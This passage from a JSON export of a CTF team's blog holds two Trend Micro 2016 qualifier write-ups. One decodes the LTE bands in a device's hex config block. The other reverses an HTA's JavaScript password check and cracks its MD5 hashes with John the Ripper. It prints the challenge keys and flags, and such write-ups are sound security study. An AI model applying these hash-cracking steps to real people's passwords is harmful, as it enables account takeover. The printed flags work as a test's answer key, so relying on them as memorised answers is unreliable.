200","slug":"Trend-Micro-Online-Qualifier-Misc-200","date":"2016-08-07T10:44:24.000Z","updated":"2017-08-10T02:56:29.901Z","comments":true,"path":"2016/08/07/Trend-Micro-Online-Qualifier-Misc-200/","link":"","permalink":"https://teamrocketist.github.io/2016/08/07/Trend-Micro-Online-Qualifier-Misc-200/","excerpt":"","text":"openssl enc -d -aes-256-cbc -k KfRdN3YhyaMhAzLftsSw -in files22.enc -out files22.zipunzip files22.zipFind the LTE bands supported by this device, for example if the device suports the bands 1,2,3 the flag will be TMCTF{1,2,3}.https://mega.nz/#!1hFXCApD!0oq_bFqbnaPsquuOySg4TSIYjPemVjzWWNqfg8OJ0WI This one was a bit confusing at first, after some searching about LTE on google I found this http://andmem.blogspot.pt/2013/11/mobilebandchange.html#chapter-10 (it’s in Japanese but if you can use google translator it’s very understandable) which explains everything I needed to know to find the flag. According to that link it says that the LTE bands are located on the 6828 (0x1AAC) block, after converting it to little-endian you can see which bits are 1’s or 0’s, if it’s 1 it supports the LTE band if not it doesn’t and we don’t need that number to be in our flag. 1234567896828 (0x1AAC) OKFF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 How to convert to little-endian: Grab the hex “FF1D1F03” and reverse from the right, so the little-endian will be “031F1DFF”. The next step will be to convert it to binary 0011 0001 1111 0001 1101 1111 1111, after this you start from the right to the left, the first bit from the right is ‘1’ so our device supports the LTE band 1 and so on, after you do this to the rest of the bits you will see the device supports this LTE frequencies bands: 1,2,3,4,5,6,7,8,9,11,12,13,17,18,19,20,21,25,26 You could always use this program to list the LTE , they will appear on that “bit information” field you can download it here (only works on windows https://mega.nz/#!HBt1CTLS!EZItWos4tvhwMMPokG1ZWN8k6lnzy2oLqWwxRRksq1Y) : Or you can do just like me do a small python script to find the flag :) 1234567891011def to_little_endian(hex): return ''.join(hex.split(' ')[::-1])a = 'FF 1D 1F 03';binary_string = bin(int(to_little_endian(a),16))[2:]l = []number_of_bits = len(binary_string)for x in xrange(0, number_of_bits): if (binary_string[number_of_bits-1 - x] == '1'): l.append(x+1)print 'TMCTF&#123;%s&#125;' % str(l)[1:-1].replace(' ', '') After running it you will get the flag :) 12kinyabitch@Debian ~/h/c/n/2&gt; python ltebands.pyTMCTF&#123;1,2,3,4,5,6,7,8,9,11,12,13,17,18,19,20,21,25,26&#125;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"LTE","slug":"LTE","permalink":"https://teamrocketist.github.io/tags/LTE/"},{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/tags/Misc/"}]},{"title":"Ofensive 100 - CTF Trend Micro Online Qualifier 2016","slug":"Ofensive-100-CTF-Trend-Micro-Online-Qualifier-2016","date":"2016-07-31T10:22:58.000Z","updated":"2017-08-10T02:50:42.021Z","comments":true,"path":"2016/07/31/Ofensive-100-CTF-Trend-Micro-Online-Qualifier-2016/","link":"","permalink":"https://teamrocketist.github.io/2016/07/31/Ofensive-100-CTF-Trend-Micro-Online-Qualifier-2016/","excerpt":"","text":"Find the flag.https://www.mediafire.com/?3x3m94598518054openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zipunzip files1.zip After unzipping the file I found strange it was a hta file extension which I never heard off, but after analyzing the code it was just some html and javascript. Some of the JavaScript code was minimized so I just used http://jsbeautifier.org/ to make it readable for humans. The first thing you can see in the code are these three interesting hashes: 1234567window.host=FnBJT9OVUieRCjeTgMPMBe4U.hs;var m = window.host;var nl = [0,2,1,12,7,15,5,4,8,16,17,3,9,10,14,11,13,6,0];var ko=\"c33367701511b4f6020ec61ded352059\";var ka=\"61636f697b57b5b7d389db0edb801fc3\";var kq=\"d2172edf24129e06f3913376a12919a4\"; The first one is actually very easy to crack I used john the ripper but you could find it even easier by searching it on google you can immediately find it’s a md5 hash by analysing the FnBJT9OVUieRCjeTgMPMBe4U.hs which is a known js code for md5 encryption. 123456kinyabitch@Debian ~/h/p/j/run&gt; ./john --wordlist=password.lst pass.txt --format=raw-md5Loaded 1 password hash (Raw MD5 [128/128 SSE2 intrinsics 12x])654321 (?)guesses: 1 time: 0:00:00:00 DONE (Sun Jul 31 13:09:53 2016) c/s: 960 trying: 1q2w3e - blazerUse the \"--show\" option to display all of the cracked passwords reliably After cracking it with john you find the hash c33367701511b4f6020ec61ded352059 was actually ‘654321’. 123456789101112131415161718192021222324252627282930313233343536373839404142function checkPW(pass) &#123;if (pass != null &amp;&amp; pass == \"close\") &#123;window.close();&#125;;if (pass == null || pass.length != 24) &#123;alert(\"Wrong password\");return;&#125;;if (pass.substring(0, 6) != \"TMCTF&#123;\" || pass.substr(pass.length - 1) != \"&#125;\") &#123;alert(\"Wrong password\");return;&#125;;var pwbody = (\" \" + pass.substring(6, pass.length - 1)).split(\"\");var h1 = \"\",h2 = \"\",h3 = \"\";for (var i = 0; i &lt; pwbody.length;) &#123;h1 += pwbody[nl[++i]];h2 += pwbody[nl[++i]];h3 += pwbody[nl[++i]];&#125;;if (co(m(h1.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; ca(m(h3.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; cq(m(h2.replace(/(^\\s+)|(\\s+$)/g, \"\")))) &#123;alert(\"ok!\");window.close();&#125; else &#123;alert(\"Wrong password\");return;&#125;;&#125;function co(o) &#123;return (o === ko);&#125;function ca(a) &#123;return (a === ka.replace(/6/g, '2').replace(/b/g, 'a').replace(/d/g, '4'));&#125;function cq(q) &#123;return (q === kq.replace(/1/g, '5').replace(/2/g, '8').replace(/3/g, 'b').replace(/9/g, 'c'));&#125; Analyzing this function was the key to this challenge with this code you can find out the flag has 18 characters always having this format “TMCTF{pass}” otherwise will be always wrong. 1234567if (pass.substring(0, 6) != \"TMCTF&#123;\" || pass.substr(pass.length - 1) != \"&#125;\") &#123;alert(\"Wrong password\");return;&#125;;var pwbody = (\" \" + pass.substring(6, pass.length - 1)).split(\"\"); After passing this first length checks you will notice that this for loop is actually mixing from different indexes splited into 3 strings (h1, h2, h3). 123456for (var i = 0; i &lt; pwbody.length;) &#123;h1 += pwbody[nl[++i]];h2 += pwbody[nl[++i]];h3 += pwbody[nl[++i]];&#125;; Then you will see somethig that is a little confusing 3 boolean conditions (co, ca and cq),the first regex expression replaces characters like spaces you will find the function in “m” that is actually the hash function into md5: 12if (co(m(h1.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; ca(m(h3.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; cq(m(h2.replace(/(^\\s+)|(\\s+$)/g, \"\")))) &#123;...&#125; And now after looking to this 3 functions you will realize why you couldn’t crack the other two, because some of its characters are being replaced by the right ones making the hash much easier to crack (you can copy the entire js code (browser JS console) and just run the replace code in ka and kq string). 123456789101112function co(o) &#123;return (o === ko);&#125;function ca(a) &#123;return (a === ka.replace(/6/g, '2').replace(/b/g, 'a').replace(/d/g, '4'));&#125;function cq(q) &#123;return (q === kq.replace(/1/g, '5').replace(/2/g, '8').replace(/3/g, 'b').replace(/9/g, 'c'));&#125; 12345678&gt; \"61636f697b57b5b7d389db0edb801fc3\".replace(/6/g, '2').replace(/b/g, 'a').replace(/d/g, '4');21232f297a57a5a743894a0e4a801fc3&gt; \"d2172edf24129e06f3913376a12919a4\".replace(/1/g, '5').replace(/2/g, '8').replace(/3/g, 'b').replace(/9/g, 'c');d8578edf8458ce06fbc5bb76a58c5ca4 A now cracking it on john you find out they ‘qwerty’ and ‘admin’. 123456kinyabitch@Debian ~/h/p/j/run&gt; ./john --wordlist=password.lst pass2.txt --format=raw-md5Loaded 3 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])Remaining 2 password hashes with no different saltsqwerty (?)admin (?) After finding this 3 hashes you can finally realize you can reconstruct the password basing on that for loop, I wrote a python script to make it easier to change (doing manually would take a lot of time and I could make mistakes): http://pastebin.com/embed_iframe/phYNZi4AAfter running it you will find the flag: 123kinyabitch@Debian ~/h/c/ofensive&gt; python crack.pyTMCTF&#123;q6r4dy5ei2na1twm3&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"hash","slug":"hash","permalink":"https://teamrocketist.github.io/tags/hash/"},{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"md5","slug":"md5","permalink":"https://teamrocketist.github.io/tags/md5/"}]}]}